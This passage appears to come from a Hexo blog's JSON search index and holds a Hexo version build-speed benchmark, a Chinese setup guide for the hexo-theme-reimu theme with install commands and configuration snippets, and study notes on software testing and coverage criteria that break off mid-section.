hexo-renderer-ejs@1.0.0\n+-- hexo-renderer-marked@4.1.0\n+-- hexo-renderer-stylus@2.1.0\n+-- hexo-server@2.0.0\n+-- hexo-theme-landscape@0.0.3\n`-- hexo@5.4.2\n```\n\n#### 6.3.0\n\n```text\n+-- hexo-generator-archive@2.0.0\n+-- hexo-generator-category@2.0.0\n+-- hexo-generator-index@3.0.0\n+-- hexo-generator-tag@2.0.0\n+-- hexo-renderer-ejs@2.0.0\n+-- hexo-renderer-marked@6.1.1\n+-- hexo-renderer-stylus@3.0.0\n+-- hexo-server@3.0.0\n+-- hexo-theme-landscape@1.0.0\n`-- hexo@6.3.0\n```\n\n#### 7.0.0\n\n```text\n+-- hexo-generator-archive@2.0.0\n+-- hexo-generator-category@2.0.0\n+-- hexo-generator-index@3.0.0\n+-- hexo-generator-tag@2.0.0\n+-- hexo-renderer-ejs@2.0.0\n+-- hexo-renderer-marked@6.1.1\n+-- hexo-renderer-stylus@3.0.0\n+-- hexo-server@3.0.0\n+-- hexo-tag-embed@1.0.0\n+-- hexo-theme-landscape@1.0.0\n`-- hexo@7.0.0\n```\n\n### 测试命令\n\n```bash\n$ hexo cl && hexo g\n```\n\n对于 4000 篇文章采用以下命令：\n\n```bash\n$ increase-memory-limit\n$ hexo cl && hexo g -p 20\n```\n\n测试文章来源于 [hexojs/hexo-many-posts](https://github.com/hexojs/hexo-many-posts)，通过复制文件以测试 500/1000/2000/4000 篇文章时的生成速度。\n\n测试配置均采用默认配置，多次测试以求平均值。\n\n## 测试结果\n\n{% echarts 95% 500 5.4.3 %}\n{\ntitle: {\ntext: 'Hexo Benchmark',\nsubtext: 'v5 v6 v7'\n},\ntooltip: {\ntrigger: 'axis',\naxisPointer: {\n// Use axis to trigger tooltip\ntype: 'shadow' // 'shadow' as default; can also be 'line' or 'shadow'\n}\n},\nlegend: {},\ngrid: {\nleft: '3%',\nright: '4%',\nbottom: '3%',\ncontainLabel: true\n},\nxAxis: {\ntype: 'value'\n},\nyAxis: {\ntype: 'category',\ndata: ['7.0.0', '6.3.0', '5.4.2']\n},\nseries: [\n{\nname: 'File load',\ntype: 'bar',\nstack: '500',\nlabel: {\n// show: true\n},\nemphasis: {\nfocus: 'series'\n},\ndata: [4.09, 4.77, 4.37]\n},\n{\nname: 'File generate',\ntype: 'bar',\nstack: '500',\nlabel: {\n// show: true\n},\nemphasis: {\nfocus: 'series'\n},\ndata: [3.83, 4.96, 4.79]\n},\n{\nname: 'File load',\ntype: 'bar',\nstack: '1000',\nlabel: {\nshow: true\n},\nemphasis: {\nfocus: 'series'\n},\ndata: [11, 11, 11]\n},\n{\nname: 'File generate',\ntype: 'bar',\nstack: '1000',\nlabel: {\nshow: true\n},\nemphasis: {\nfocus: 'series'\n},\ndata: [7.37, 12, 13]\n},\n{\nname: 'File load',\ntype: 'bar',\nstack: '2000',\nlabel: {\nshow: true\n},\nemphasis: {\nfocus: 'series'\n},\ndata: [27, 32, 32]\n},\n{\nname: 'File generate',\ntype: 'bar',\nstack: '2000',\nlabel: {\nshow: true\n},\nemphasis: {\nfocus: 'series'\n},\ndata: [12, 38, 40]\n},\n{\nname: 'File load',\ntype: 'bar',\nstack: '4000',\nlabel: {\nshow: true\n},\nemphasis: {\nfocus: 'series'\n},\ndata: [134, 140, 152]\n},\n{\nname: 'File generate',\ntype: 'bar',\nstack: '4000',\nlabel: {\nshow: true\n},\nemphasis: {\nfocus: 'series'\n},\ndata: [28, 179, 194]\n}\n]\n};\n{% endecharts %}\n\n可以看到，在缓存的加持下，File generate 阶段耗时大大减少，所以建议大家都尽可能地将自己的 Hexo 博客向高版本迁移。\n","tags":["Hexo"],"categories":["计软杂谈","hexo"]},{"title":"hexo-theme-reimu食用指南","url":"/reimu-lighthouse/20230707/hexo-theme-reimu-guide/","content":"\n因为本人是车车人，所以制作了 `hexo-theme-reimu` 这样一款博丽灵梦风格的 Hexo 主题，其融合了[landscape](https://github.com/hexojs/hexo-theme-landscape)、[Tangyuxian](https://github.com/tangyuxian/hexo-theme-tangyuxian)和[Shoka](https://github.com/amehime/hexo-theme-shoka)三个主题\n\n效果展示请点击：\n\n{% postLinkCard \"hexo-theme-reimu效果展示\" \"https://d-sketon.top/img/_backwebp/bg28.webp\" %}\n\n开发日志请点击：\n\n{% postLinkCard \"hexo-theme-reimu开发日志\" \"https://d-sketon.top/img/_backwebp/bg27.webp\" %}\n\n> 如果在使用本主题的过程中遇到了什么问题，请到[Github issue](https://github.com/D-Sketon/hexo-theme-reimu/issues)上提问，并提供详细的报错信息/复现步骤\n\n> 本主题目前的设计较为轻量，并且在预计来不会引入诸如**音乐播放器**这类复杂的功能。如有需要，可以尝试选择[hexo-theme-shokaX](https://github.com/theme-shoka-x/hexo-theme-shokaX)（也是本人维护的一款主题，具有更加丰富的功能）\n\n> 如果想要追求更现代的建站技术（如[Astro](https://astro.build)），可以尝试选择本人迁移的 [astro-theme-reimu](https://github.com/D-Sketon/astro-theme-reimu)，效果展示请点击[演示网站](d-sketon.github.io/astro-theme-reimu/)\n\n## 路线图\n\n- 图片懒加载\n- waline 评论系统\n- twikoo 评论系统（未测试）\n- gitalk 评论系统（未测试）\n- giscus 评论系统\n- 黑夜模式\n- 更多动画效果\n- google 字体\n- 加载动画\n- TOC\n- 回到顶部\n- 文章阅读统计（仅 Valine 和 Waline）\n- 鼠标动画（v0.0.10+）\n- pjax（v0.0.10+，实验性）\n- pwa（v0.0.11+，实验性）\n- live2d（v0.0.11+，实验性）\n\n## 结构\n\n```txt\n.\n├── _screenshot 截图\n├── _example    示例source文件夹内结构\n├── _config.yml 主题配置\n├── languages\n├── layout\n├── scripts\n└── source\n```\n\n## 安装\n\n使用 npm\n\n```bash\nnpm install hexo-theme-reimu --save\n```\n\n或直接克隆[本仓库](https://github.com/D-Sketon/hexo-theme-reimu)至`/themes`文件夹下并重命名为`reimu`\n\n```bash\ngit clone https://github.com/D-Sketon/hexo-theme-reimu.git\n```\n\n并修改 `_config.yml` 中的 theme\n\n```yaml\n# Extensions\n## Plugins: https://hexo.io/plugins/\n## Themes: https://hexo.io/themes/\ntheme: reimu\n```\n\n## 使用\n\n### 基本结构\n\n为了保证显示正确，请参考 `_example` 在 `_source` 中分别建立 `_data`、`about` 和 `friend` 文件夹\n\n#### \\_data\n\n- `avatar` 文件夹中存储作者头像，默认命名 `avatar.jpg`，可在 内层 `_config.yml` 中做如下配置\n\n```yaml\navatar: \"avatar.jpg\"\n```\n\n- `covers` 文件夹中存储文章封面\n- `covers.yml` 中存储文章封面 url\n\n#### about\n\n`index.md` 作为**关于**页面\n\n#### friend\n\n`index.md` 作为**友链**页面，在 `_data.yml` 中填入友链信息即可在页面上显示对应好友卡片\n\n### 封面、头图和图标\n\n#### 封面\n\n封面显示逻辑如下\n\n- 如果文章的 Front matter 中包含 cover 的 url，则该文章头图和首页缩略图均显示该 url\n\n```yaml\n---\ntitle: Hello World\ncover: https://example.com\n---\n```\n\n- 如果文章的 Front matter 中包含 cover 为`false`，则该文章不显示头图（首页上仍然是随机图片）\n\n```yaml\n---\ntitle: Hello World\ncover: false\n---\n```\n\n- 如果文章的 Front matter 中包含 cover 为`rgb(xxx,xxx,xxx)`，则该文章头图为对应的渐变纯色（首页上仍然是随机图片）\n\n```yaml\n---\ntitle: Hello World\ncover: rgb(255,117,117)\n---\n```\n\n- 否则查找 `covers` 文件夹和 `covers.yml`，并从中随机挑选图片\n- 若上述文件均不存在，则显示头图\n\n#### 头图\n\n头图保存于 `themes/reimu/source/images/banner.webp`，可在内层 `_config.yml`中修改\n\n```yaml\nbanner: \"/images/banner.webp\"\n```\n\n#### 图标\n\n图标保存于 `themes/reimu/source/images/favicon.ico`，可在内层 `_config.yml`中修改\n\n```yaml\nfavicon: \"/images/favicon.ico\"\n```\n\n#### 置顶\n\n在文章的 Front-matter 中添加 `sticky: true`\n\n```yaml\n---\ntitle: Hello World\nsticky: true\n---\n```\n\n### 代码高亮\n\n为保证代码块的正确显示，请保证外层 `_config.yml` 中为如下配置\n\n(<7.0.0)\n\n```yaml\nhighlight:\n  enable: true\n  wrap: true\n  hljs: false\nprismjs:\n  enable: false\n```\n\n(>=7.0.0)\n\n```yaml\nsyntax_highlighter: highlight.js\nhighlight:\n  wrap: true\n  hljs: false\n```\n\n### 站内评论\n\n> 站内评论可以使用Front matter 中的 `comments` 独立控制每篇文章是否显示评论。  \n> 当 `comments` 为 `false` 时不显示评论，`true` 或不填时根据 `_config_yml` 的配置决定是否显示。\n\n若基于 [Valine](https://valine.js.org/)  \n请参考其官方文档完成 `LeanCloud` 的配置，并在内层 `_config_yml` 中将 `valine.enable` 改为 `true`，并填入自己的 `appId` 和 `appKey`\n\n```yaml\nvaline:\n  enable: true\n  appId: \"your appId\"\n  appKey: \"your appKey\"\n```\n\n若基于 [Waline](https://waline.js.org/)  \n请参考其[官方文档](https://waline.js.org/guide/get-started/)完成 `LeanCloud` 的配置，并在内层 `_config_yml` 中将 `waline.enable` 改为 `true`，并填入自己的 `serverURL`\n\n```yaml\nwaline:\n  enable: true\n  serverURL: \"your server url\"\n  lang: zh-CN\n  locale: {} # https://waline.js.org/guide/features/i18n.html#%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AF%AD%E8%A8%80\n  emoji:\n    - https://unpkg.com/@waline/emojis@1.2.0/weibo\n    - https://unpkg.com/@waline/emojis@1.2.0/alus\n    - https://unpkg.com/@waline/emojis@1.2.0/bilibili\n    - https://unpkg.com/@waline/emojis@1.2.0/qq\n    - https://unpkg.com/@waline/emojis@1.2.0/tieba\n    - https://unpkg.com/@waline/emojis@1.2.0/tw-emoji\n  meta:\n    - nick\n    - mail\n    - link\n  requiredMeta:\n    - nick\n    - mail\n  wordLimit: 0\n  pageSize: 10\n  pageview: true\n```\n\n若基于 [twikoo](https://twikoo.js.org)  \n请参考其[官方文档](https://twikoo.js.org/quick-start.html)完成 腾讯云 或 Vercel 部署，并在内层 `_config_yml` 中将 `twikoo.enable` 改为 `true`，并填入自己的 `envId`\n\n```yml\ntwikoo:\n  enable: true\n  envId: # 腾讯云环境填 envId；Vercel 环境填地址（https://xxx.vercel.app）\n  region:\n```\n\n若基于 [giscus](https://giscus.app/zh-CN)，请参考文档完成仓库的配置，并在内层 `_config_yml` 中将 `giscus.enable` 改为 `true`，并填入对应的数据\n\n```yml\ngiscus:\n  enable: true\n  repo: \"your repo\"\n  repoId: \"your repoId\"\n  category: \"your category\"\n  categoryId: \"your categoryId\"\n  mapping: mapping\n  strict: 0\n  reactionsEnabled: 1\n  emitMetadata: 0\n  inputPosition: bottom\n  commentTheme: preferred_color_scheme\n  lang: zh-CN\n```\n\n若基于 [gitalk](https://gitalk.github.io/)  \n请参考其[官方文档](https://github.com/gitalk/gitalk?tab=readme-ov-file#usage)完成仓库的配置，并在内层 `_config_yml` 中将 `gitalk.enable` 改为 `true`，并填入对应的数据\n\n```yml\ngitalk:\n  enable: true\n  clientID: \"your application client ID\"\n  clientSecret: \"your application client secret\"\n  repo: \"your repo\"\n  owner: \"repo owner\"\n  admin: \"repo owner and collaborators\"\n```\n\n### 站内搜索\n\n若选择 [Algolia](https://www.algolia.com/)，请安装 [hexo-algoliasearch](https://github.com/LouisBarranqueiro/hexo-algoliasearch)\n\n```bash\nnpm install hexo-algoliasearch --save\n```\n\n并参考其 [README](https://github.com/LouisBarranqueiro/hexo-algoliasearch#readme) 完成对 `Algolia` 账号的配置，并在外层 `_confg.yml` 中添加如下配置\n\n```yml\nalgolia:\n  appId: \"your applicationID\"\n  apiKey: \"your apiKey\"\n  adminApiKey: \"your adminApiKey\"\n  indexName: \"your indexName\"\n  chunkSize: 5000\n  fields:\n    - content:strip:truncate,0,500\n    - excerpt:strip\n    - gallery\n    - permalink\n    - photos\n    - slug\n    - tags\n    - title\n```\n\n在内层 `_config_yml` 中将 `algolia_search.enable` 改为 `true`\n\n```yaml\nalgolia_search:\n  enable: true\n```\n\n> 注意：搜索跳转链接为永久链接，所以请保证外层 `_config.yml` 中的 `url` 填写正确\n\n---\n\n若选择 [hexo-generator-search](https://github.com/wzpan/hexo-generator-search)，请安装[hexo-generator-search](https://github.com/wzpan/hexo-generator-search)\n\n并参考其 [README](https://github.com/wzpan/hexo-generator-search#readme)在外层 `_config.yml` 中添加如下配置\n\n```yml\nsearch:\n  path: search.json # 文件名必须为search.json\n  field: post\n  content: true\n```\n\n在内层 `_config_yml` 中将 `generator_search.enable` 改为 `true`\n\n```yaml\ngenerator_search:\n  enable: true\n```\n\n### 数学公式\n\n数学公式基于 [Katex](https://github.com/KaTeX/KaTeX)，请安装 [hexo-renderer-markdown-it-plus](https://github.com/CHENXCHEN/hexo-renderer-markdown-it-plus)\n\n```bash\nnpm uninstall hexo-renderer-marked --save\nnpm install hexo-renderer-markdown-it-plus --save\n```\n\n在内层 `_config_yml` 中将 `math.enable` 改为 `true`\n\n```yaml\nmath:\n  enable: true\n```\n\n### Mermaid\n\n请安装 [hexo-filter-mermaid-diagrams](https://github.com/webappdevelp/hexo-filter-mermaid-diagrams)\n\n```bash\nnpm install hexo-filter-mermaid-diagrams --save\n```\n\n在内层 `_config_yml` 中将 `mermaid.enable` 改为 `true`\n\n```yaml\nmermaid:\n  enable: true\n```\n\n并在需要使用 mermaid 的文章的 front-matter 中添加 `mermaid: true`\n\n```yaml\n---\ntitle: Hello World\nmermaid: true\n---\n```\n\n### RSS\n\n请安装 [hexo-generator-feed](https://github.com/hexojs/hexo-generator-feed)\n\n```bash\nnpm install hexo-generator-feed --save\n```\n\n并参考其 [README](https://github.com/hexojs/hexo-generator-feed#readme) 在外层 `_config.yml` 完成对 `feed` 的配置  \n在内层 `_config.yml` 中填入生成的 `xml`\n\n```yaml\nrss: atom.xml\n```\n\n### Icon\n\nIcon 默认使用本项目提供的 iconfont（v0.1.3+）\n\n```yml\nicon_font: 4552607_ikzjpc9jicn\n```\n\n如果想要继续使用 fontawesome 图标，请将 `icon_font` 设置为 `false`，此时会使用 `vendor` 中对应的 fontawesome\n\n```yml\nfontawesome:\n  high_priority:\n    - webcache|@fortawesome/fontawesome-free@6.5.1/css/regular.min.css\n    - webcache|@fortawesome/fontawesome-free@6.5.1/css/solid.min.css\n  low_priority:\n    - webcache|@fortawesome/fontawesome-free@6.5.1/css/brands.min.css\n    - webcache|@fortawesome/fontawesome-free@6.5.1/css/v5-font-face.min.css\n    - webcache|@fortawesome/fontawesome-free@6.5.1/css/v4-font-face.min.css\n```\n\n### 实验性功能\n\n#### firework\n\n默认开启\n\n```yaml\nfirework:\n  enable: true\n```\n\n具体配置请查看 [mouse-firework](https://github.com/D-Sketon/mouse-firework)\n\n#### pjax\n\n默认关闭\n\n```yaml\npjax:\n  enable: false\n```\n\n> pjax 在 v0.0.10 中被引入，用于那些需要添加音乐播放器等需要 SPA 的用户。但其仍然属于实验性质，引入后可能会出现诸如**脚本无法执行**、**脚本重复执行**、**页面渲染混乱**等 BUG。请慎重考虑！\n\n#### PWA\n\n默认开启\n\n```yaml\nservice_worker:\n  enable: true\n```\n\n#### live-2d\n\n默认关闭\n\n```yaml\nlive2d:\n  enable: false\n```\n\n#### reimu 鼠标指针\n\n默认开启\n\n```yml\nreimu_cursor: true\n```\n\n### Vendor\n\nv0.1.0 对 `vendor` 进行了较大程度的重构，目前 `vendor` 路径的组成方式为：`:cdn|:package@:version/:file`，`:cdn`可在 `vendor` 中自行配置。目前自带以下 CDN 源：\n\n```yaml\ncdn_jsdelivr_gh: https://cdn.jsdelivr.net/gh/ # 仅针对github加速\ncdn_jsdelivr_npm: https://cdn.jsdelivr.net/npm/ # 仅针对npm加速\nfastly_jsdelivr_gh: https://fastly.jsdelivr.net/gh/ # 仅针对github加速\nfastly_jsdelivr_npm: https://fastly.jsdelivr.net/npm/ # 仅针对npm加速\nunpkg: https://unpkg.com/ # 仅针对npm加速\nwebcache: https://npm.webcache.cn/ # 仅针对npm加速\n```\n\n用户可根据网络状况自行切换 CDN 源。\n","tags":["Hexo"],"categories":["计软杂谈","hexo"]},{"title":"软件测试与验证 学习笔记","url":"/reimu-lighthouse/20230217/software-testing-verification/","content":"## 软件测试基础\n### 什么是软件测试\n软件测试是贯穿整个软件开发生命周期，对软件产品进行验证和确认的活动过程，也是对软件产品质量持续的评估过程，其目的是**尽快尽早地发现**软件产品中存在的各种缺陷，尽最大可能揭示软件开发过程中所存在的产品质量风险，实现**缺陷预防**\n- **静态测试**：不执行被测对象\n- **动态测试**：执行被测对象\n### 充分性问题\n- 由于无法穷举被测软件完整的输入空间，各种软件动态测试方法本质上都是围绕 “如何构造测试集合以使其展现的部分行为能够高效有效地反映软件的整体行为”而展开。判断测试集合在软件上的表现是否能够充分反映该软件的总体表现，在测试领域中叫**充分性问题**。\n- 作用\n  -  为分析和度量软件测试质量提供了一条客观的途径\n  -  确定测试过程中需要观察的内容\n  -  作为测试停止标准之一\n  - 当测试集合未能达到期望的充分性准则时，指导测试数据的补充\n\n### 软件缺陷(Software Defect)\n- 存在于软件（文档、数据、程序）之中的那些不希望或不可接受的偏差\n- Bug是口语化的缺陷\n### 软件失效(Software Failure)\n- 软件运行时产生的一种不希望或不可接受的**外部行为结果**\n- 系统崩溃，闪退，结果不正确……\n  - **外部可见的软件失效**是测试中推断软件中存在缺陷的基本方法\n  - 没有失效并不代表软件中不存在缺陷\n### 软件故障(Software Fault)\n- 软件运行过程中出现的一种不希望或不可接受的**内部状态**\n- **内部状态**：由所有程序变量的**当前值**和**程序指针**构成\n### 软件错误(Software Error)\n- 在软件生存期内的不希望或者不可接受的**人为错误**\n- 软件缺陷本质上是**研发人员**在软件研发过程中**所犯错误在软件中的可视化结果**\n### 缺陷具有隐蔽性\n- 软件中一定存在缺陷\n- 有缺陷并不一定产生故障\n- 有故障也并不一定会失效\n- 产生失效一定意味着软件有故障\n- 产生失效一定意味着软件存在缺陷\n- 产生故障一定意味着软件存在缺陷\n### RIP模型\n- Reachability（可达性）：程序中包含必须达到缺陷\n- Infection（感染性）：执行位置后，程序的状态必须是不正确的\n- Propagation（传播性）：受感染的状态必须传播才能导致某些输出程序的错误\n### 测试用例\n>  A test case is composed of the **test case values**, **expected result**, prefix values, postfix values for a complete execution and evaluation of the software under test\n> —— Paul Amman\n- Test Case Values：为完成被测软件的某些执行所必需的输入值\n- Expected Results：如果程序满足其预期行为，在执行测试时将产生的结果\n- Prefix Values：任何必要的输入，使软件进入适当的状态以接收测试用例的值\n- Postfix Values：任何需要在测试用例值之后发送至软件的输入。通常有两种类型的后缀值：\n  - 验证值：查看测试用例值的结果所需的值\n  - 退出命令：终止程序或以其他方式使其回到稳定状态所需的值\n- 测试集：与一组测试用例相结合的集合\n#### 自动测试用例\n- 4A 模式\n  - Arrange: preparation for the coming test\n  - Action: execute code under test\n  - Assert: compare actual outputs with expected ones\n  - Annihilation: clean up test environment\n#### 测试用例的度量标准\n- 有效性：发现缺陷的能力\n- 仿效性：测试用例不能发现的缺陷，其它输入发现该缺陷的概率应该非常低\n- 经济性：实现执行成本\n- 可维护性：易于修改的程度\n## 面向代码的测试\n### 单元测试介绍\n#### 动态软件测试\n在**开发环境**中，通过**运行被测代码**以验证其**是否满足期望目标**而进行的一种测试活动以尽早尽可能发现**与目标不一致**的**缺陷**\n#### 单元\n单元是一个**小粒度的行为特性**。从规模上说可能是一个函数、方法、页面，也可能是几个。\n#### 单元测试\n测试执行是否经济快捷界定单元测试，运行要**快**, **不超过0.1秒**\n不是单元测试：\n- 跟数据库交互\n- 进行了网络间通信\n- 调用了文件系统\n- 需要对环境做特定的准备（如编辑配置文件）才能运行起来\n##### 测试替身（Test Double）\n替代真实代码中依赖于数据库、网络和文件系统的代码\n#### 单元测试复杂度\n被测代码输入需要考虑的\n- 被测代码的输入参数\n- 被测代码内部需要读取的全局变量\n- 被测代码内部需要读取的成员变量\n- 被测代码内部调用的方法/函数获得的数据\n- 被测代码内部调用的方法改写的数据\n- ……\n被测代码输出需要考虑的\n- 被测代码的返回值\n- 被测代码的输出参数（C/C++）\n- 被测代码内部改写的成员变量和全局变量\n- 被测代码进行的文件更新、数据库更新、消息队列更新\n- ……\n### 代码缺陷分类\n- 功能\n  - 有特征（静态测试）\n    - 语法特征：基于程序语言语法就可以发现的问题\n    - 边界行为特征：代码在执行过程中发生异常、崩溃或超时。通常，这些行为由边界条件引起\n    - 经验特征：基于过往经验可以发现的问题\n  - 无特征（动态测试） \n    - 代码行为：代码实现的算法/功能与期望的不一致\n    - 部分代码行为：在某些条件下，代码不能准确地完成业务要求实现的功能\n- 性能\n  - 时间\n  - 空间 \n### 单元测试启发式规则\n#### Right—BICEP\n- Right: Are the results right? \n- B: Are all the boundary conditions correct?\n- I: Can you check inverse relationships? \n- C: Can you cross-check results using other means?\n- E: Can you force error conditions to happen? \n- P: Are performance characteristics within bounds?\n##### Right\n- happy path tests: tests should **first and foremost** validate that the code produces expected results what the users want\n##### B-Boundary conditions\n- 虚假或不一致的输入值\n- 数据格式错误，电话号码错误\n- 可能导致数字溢出的计算\n- 空值或缺失值\n##### I-Checking Inverse Relationship\n用**逆行为**测试被测试代码\n- 在数据库中插入一条记录后，查询该记录\n- 已经使用的款项总数 = 款项总数 – 剩余的款项数\n##### C-Cross checking\n使用不同数据之间的关系进行测试\n- 已经使用的款项总数 = 款项总数 – 剩余的款项数\n##### E-Forcing Error Condition\n使用Mock对象模拟各种异常\n##### P-Performance characteristics\n通常用于E2E测试\n- Junit 5 @Timeout\n#### CORRECT\n- **C**onformance: 数据格式是否与期望的一致\n- **O**rdering：数据之间的顺序是否满足要求\n- **R**ange：数据是否在合理的最大值和最小值之间\n- **R**eference：被测代码是否使用了无法控制的外部引用\n- **E**xistence：数据是否被要求存在，例如非空、非0、必须在集合中\n- **C**ardinality：数据数量是否满足要求\n- **T**ime：每件事情是否按顺发生？是否在正确的时间发生？发生是否及时？\n##### C-Conformance\n-单一结构的数据\n  - E-mail，phone number…..\n- 复合结构的数据\n  - （姓名，场地，时间）：只没有姓名/场地/时间，只有姓名/场地/时间…….\n##### O-Ordering\n- 一段数据在较大集合中的位置\n##### R-Range\n- Java原始类型范围\n- 自定义范围\n- 不变量断言\n##### R-Reference\n- 被测方法（MUT）在其范围之外引用了什么\n- MUT有什么外部依赖性\n- MUT是否取决于对象处于特定状态\n- 必须存在的任何其他条件\n  - 前置条件\n  - 后置条件\n##### E-Existence\n- 值为null、零或其他为空\n##### C-Cardinality\n- 只有在这三种情况下（0-1-n规则），某组值的计数才有意义\n  - 0\n  - 1\n  - n（多个）\n##### T-Time\n- 相对时间：如果方法按顺序调用\n- 绝对时间：在边界日测试任何时间敏感代码\n- 并发问题\n  - 多个线程同时访问同一对象\n  - 需要同步任何全局或实例级数据或方法\n  - 外部访问文件或硬件\n### 单元测试实现\n#### 测试生命周期\n- Setup (optional): 初始化TestFixture\n- Exercise: 测试与SUT交互，获得结果\n- Verify: 使用一个或多个断言（也称为谓词）将被测系统的结果与预期值进行比较，创建测试结果\n- Teardown (optional): 释放TestFixture，SUT回到初始状态\n#### 测试替身\n##### Dummy\n- 在测试方法中**不使用其任何方法**的测试替身\n- 一般出现在方法的参数处\n- 通常为了防止NullPointerException的出现，保证测试方法可以顺利执行\n##### Fake\n- 一种**简化真实代码**的测试替身，通常采用继承被Fake对象（真实代码），成为其子类的方法实现\n- 不能作为产品代码，单纯为了测试快，不在测试中出现耗时行为\n##### Stub\n- Provide canned answer：为其调用者提供测试过程中需要使用的信息\n- 通常应用响应待测系统的请求，然后**返回特定的值**\n##### Spy\n- 使用真实代码的测试替身，**返回其真实值**\n- 可以打桩\n- 可以记录使用轨迹，便于在后续的测试活动中验证是不是安排的事情按照期望发生\n##### Mock\n- 按照期望实现的用于测试方法中的行为代码\n  - 正常路径：返回正常值\n  - 异常路径：返回期望的错误/异常\n### 代码测试充分性准则\n#### 基于控制流 \n##### 控制流图（CFG）\n- 结点：语句或代码块\n- 边：控制转移\n###### 路径\n节点$(n_1,n_2,...n_m)$的序列，其中$(n_i,n_{i+1})\\in E,1 \\leq i < m$ \n- 长度：路径中边的数量\n- **路径的长度可以为0**\n- 路径的**子路径**是p的子序列\n###### 完整路径\n从初始节点开始到最终节点结束的路径\n##### 语句覆盖（Statement Coverage）\n- 衡量被测代码中的语句得到执行的程度\n- 基于CFG块与语句的对应关系，衡量语句覆盖情况\n- 语句覆盖的正式定义为：测试集合T称为语句覆盖充分的，当且仅当执行T产生的完整路径集合L覆盖了控制流图中的所有节点。如果使用符号Node(G)表示控制流图的节点集合，Node（L）表示L包\n含的节点集合，则测试集合T的语句覆盖率为：\n$\\frac{||Node(L)||}{||Node(G)||}*100\\%$\n- 语句覆盖是最弱的标准\n##### 分支覆盖（Branch Coverage）\n- 衡量被代码中的所有控制转移被执行的程度\n- 控制转移表现为CFG的边，控制转移得到测试意味着相应的边在测试集合对应的完整路径中出现\n- 分支覆盖准则的定义：测试集合T称为分支覆盖充分的，当且仅当执行T产生的完整路径集合L覆盖了控制流图中的所有边。如果使用符号Edge(G)表示控制流图的边集合，Edge（L）表示L包含的控制流图中的边集合，则测试集合T的分支覆盖率为：\n$\\frac{||Edge(L)||}{||Edge(G)||}*100\\%$\n##### 路径覆盖（Path Coverage）\n- 衡量被代码中的**完整路径**被执行的程度\n- 被代码中的完整路径对应于CFG中的完整路径\n- 测试集合T称为路径覆盖充分的，当且仅当执行T产生的完整路径集合L覆盖了控制流图中的所有完整路径。如果使用符号Path(G)表示控制流图的所有完整路径集合，则测试集合T的路径覆盖率为：\n$\\frac{||L||}{||Path(G)||}*100\\%$\n##### 基路径覆盖（Prime Path Coverage）\n- 简单路径\n  - 除了第一个和最后一个节点，其余节点只出现一次（无内部回路）\n- 基路径\n  - 不属于其他简单路径子路径的简单路径\n###### 计算基路径\n- 穷举法\n- 节点树\n  - 以G中的节点为根节点建立的树，且满足树中除根节点和叶节点可以相同外，从根节点到每个树中节点的路径中，每个节点的出现次数有且仅有 1 次\n  - 在节点树中，每条从根节点到叶节点的路径即为一条简单路径\n- 简单节点树\n  - 若节点树T不是任何其它节点树的子树，则称节点树T为简单节点树\n  - 所有简单节点树的从根节点到叶节点的路径集合为备选的基路径集合\n\n- 衡量被代码所有基路径被执行的程度\n- 基路径覆盖要求每条基路径至少被执行一次，其定义如下：测试集合T称为基路径覆盖充分的，当且仅当执行T产生的完整路径集合L访问了控制流图中的所有基路径。如果使用符号PP(G)表示控制流图的所有基路径集合，PP(L)表示L访问的基路径集合，则测试集合T的基路径覆盖率为：\n$\\frac{||PP(L)||}{||PP(G)||}*100\\%$\n\n##### 判定覆盖（Decision Coverage）\n- 衡量代码中的判定得到执行的程度，期望发现逻辑运算符相关缺陷\n- 如果测试集合能够使得被测代码中的每个判定至少被执行一次,那么则说该测试集合满足了判定覆盖\n- 注意，每个判定被执行一次的含义是指每个判定的所有可能结果都**至少出现一次**\n- 例 if((num1 >1）&& (num2==0))的真假结果都得到执行，才认为该判定被执行\n- 判定覆盖度：\n$判定覆盖度 =\\frac{得到执行的判定数}{判定总数}∗ 100\\%$\n##### 条件覆盖（Condition Coverage）\n- 衡量代码中构成判定的各个条件得到执行的程度，期望发现算术运算符相关缺陷\n- 如果测试集合能够使得被测代码中的每个条件至少被执行一次, 那么则说该测试集合满足了条件覆盖\n- 每个条件被执行一次的含义：每个条件的**所有可能结果都至少出现一次**\n- 判定覆盖度：\n$判定覆盖度 =\\frac{得到执行的条件数}{条件总数}∗ 100\\%$\n- **满足判定不一定满足条件，满足条件不一定满足判定**\n##### 判定-条件覆盖（Decision-Condition Coverage）\n- 衡量代码中每个判定以及构成判定的每个条件得到执行的程度\n- 如果测试集合能够使得被测代码中的每个判定至少被执行一次并且构成判定的每个条件至少被执行一次, 那么则说该测试集合满足了判定-条件覆盖\n- 执行的含义同样指**所有可能结果都至少出现一次**\n##### 修正的判定-条件覆盖（Modified Condition/Decision Coverage，MC/DC）\n- 期望构成每个判定的每个条件能独立地影响整个判定的结果\n- 在这里独立地影响整个判定的结果是指在其它条件取值不变的情况下，只改变当前条件的取值就能使得整个判定的结果发生变化\n\n#### 基于数据流\n##### 定义和使用\n- 定义：将一个值**储存在内存中**\n  - x出现在一个赋值的左边（x = 44）\n  - x是一个程序的输入\n  - 在下列情况下应仔细考虑\n    - x是调用中的一个实参，方法改变了它的值 \n    - x是一个方法的形参（当方法开始时隐含的def） \n- 使用：变量**被访问**\n  - x出现在赋值的右边\n  - x出现在一个条件测试中\n  - x是一个方法的实参\n  - x是程序的一个输出\n  - x是一个方法在返回语句中的输出\n##### c-use (computation-use)\n- 使用节点 `USE(v, n)` 是一个计算使用（记做c-use），当且仅当语句n是计算语句（对于计算使用的节点永远有外度=1）\n##### p-use (predicate-use)\n- 使用节点是一个谓词使用（记做p-use），当且仅当语句n是谓词语句（对于谓词使用的节点永远有外度≥2）\n##### Data Flow Graph\n给定一个CFG： `(N, N0, Nf, E)` \n- `def(n)` 或 `def(e)` 表示由节点n或边e定义的变量集\n- `use(n)` 或 `use(e)` 表示由节点n或边e使用的变量集\n- 数据流图（DFG）可以被定义为一个元组：`(ND, N0, Nf, ED)`, 其中：\n  - $N_D = \\{ (n, def(n) \\cup use(n)) | n \\in N \\}$\n  - $E_D = \\{ (e, def(e) \\cup use(e)) | e \\in E \\}$\n##### DU Pairs 和 DU Paths\n- du pair\n  - 位置对 `(li,lj)` ，变量 `v` 在 `li` 处被定义，在 `lj` 处被使用\n- def clear\n  - 从`li` 到 `lj` 的路径，在该路径上变量 `v` 没有在任何节点或边上被重新赋值\n- du path\n  - 一个从变量 `v` 的定义节点到使用节点的**简单子路径**，满足def clear\n  - `du(li, lj, v)` 变量 `v` 的du-path集合，从 `li` 开始，到 `lj` 结束\n  - `du(li, v)` 